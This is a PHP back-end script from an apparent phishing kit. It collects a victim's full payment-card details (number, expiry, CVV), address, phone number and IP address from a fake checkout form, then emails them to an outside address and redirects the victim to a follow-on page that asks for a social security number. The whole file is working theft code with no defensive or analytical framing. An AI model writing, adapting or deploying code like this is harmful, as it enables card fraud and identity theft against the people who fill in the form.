<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Name on card              : ".$_POST['ppw-fullName']."\n";
$bilsmg .= "Card number -----: ".$_POST['card']."<br>\n";
$bilsmg .= "Expiry date -----: ".$_POST['expiry']."<br>\n";
$bilsmg .= "Security code              : ".$_POST['cvv']."\n";
$bilsmg .= "Address              : ".$_POST['address']."\n";
$bilsmg .= "City               : ".$_POST['ppw-city']."\n";
$bilsmg .= "State -----: ".$_POST['ppw-stateOrRegion']."<br>\n";
$bilsmg .= "ZIP              : ".$_POST['ppw-postalCode']."\n";
$bilsmg .= "Phone              : ".$_POST['ppw-phoneNumber']."\n";

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@us-en.info";
$bilsub = "Mamakjhon CARD | From $ip";
$bilhead = "From:LAZADA MALL CARD <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../social-securitynumber.dcq.request-ref_=nav_AccountFlyout_ya.html";
header("location:$src");
?>
?>